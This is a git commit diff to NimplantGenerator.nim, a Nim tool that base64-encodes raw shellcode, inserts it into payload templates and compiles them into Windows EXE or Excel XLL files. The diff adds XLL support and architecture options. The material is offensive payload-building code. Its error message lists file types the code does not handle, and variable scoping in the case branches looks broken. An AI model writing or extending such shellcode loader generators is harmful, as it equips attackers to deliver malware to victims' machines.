6c77a5374240ab0e2fe02f244a30547386df3338
RePRGM <92693582+RePRGM@users.noreply.github.com>
2022-12-05 08:06:47 -0500

    Update NimplantGenerator.nim

--- NimplantGenerator.nim
+++ NimplantGenerator.nim
@@ -5,17 +5,43 @@ import os
 import osproc
 
 let 
+    args = commandLineParams()
     pCount = paramCount()
-    shellcodeFilePath = paramStr(1)
-    fileType = paramStr(2)
-    verbosity = paramStr(3)
+
+var 
+    shellcodeFilePath: string
+    fileType: string
+    architecture: string
+    verbosity: string
+
+if pCount < 2:
+    echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
+    echo "\nArguments <architecture> for file types other than XLL and <verbose> are optional"
+    quit(1)
+else: 
+    shellcodeFilePath = args[0]
+    fileType = args[1]
+
+    if pCount > 2:
+        architecture = args[2] #only for xll payloads
+
+    if pCount > 3:
+        verbosity = args[3]
+
+let
     compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim" 
-    
+    compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -o=simplexll.xll temp_simplexll.nim"
+    compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -o=simplexll.xll temp_simplexll.nim"
+
 var 
     file: string
     templatePath: string
 
-when isMainModule:
+proc generatePayload(): void =
+    var 
+        templateFile: string
+        tempFile: string
+        compileCmd: string
     # Read raw shellcode file
     try:
         file = readFile(shellcodeFilePath)
@@ -25,16 +51,36 @@ when isMainModule:
     # Base64 encode bytes
     let b64shellcode = encode(file)
     # Add base64 shellcode to template
-    if fileType == "exe":
-        templatePath = "templates/simpleexe.nim"
-        var templateFile = templatePath.readFile()
-        var tempFile = "temp_simpleexe.nim"
-        let placeholder = "REPLACE_ME"
-        let replacement =  b64shellcode
-        templateFile = templateFile.replace(placeholder, replacement)
-        tempFile.writeFile(templateFile)
+    case fileType:
+        of "exe":
+            templatePath = "templates/simpleexe.nim"
+            var templateFile = templatePath.readFile()
+            var tempFile = "temp_simpleexe.nim"
+            compileCmd = compileExe
+        of "xll":
+            templatePath = "templates/simplexll.nim"
+            var templateFile = templatePath.readFile()
+            var tempFile = "temp_simplexll.nim"
+            if architecture == "x64":
+                compileCmd = compileXll64
+            else:
+                compileCmd = compileXll32
+        else:
+            echo "Error: filetype argument must be dll, xll, or cpl!"
+            quit(1)
+    let placeholder = "REPLACE_ME"
+    let replacement =  b64shellcode
+    templateFile = templateFile.replace(placeholder, replacement)
+    tempFile.writeFile(templateFile)
 
-        let compileResults = execCmdEx(compileExe)
-        tempFile.removeFile
-        if verbosity == "verbose":
-            echo compileResults.output
+    let compileResults = execCmdEx(compileCmd)
+    tempFile.removeFile
+    if verbosity == "verbose":
+        echo compileResults.output
+
+when isMainModule:
+    if pCount >= 2:
+        generatePayload()
+    else:
+        echo fmt"Usage: {getAppFileName()} <rawShellcodeFile> <fileType> <architecture> <verbose>"
+        quit(1)
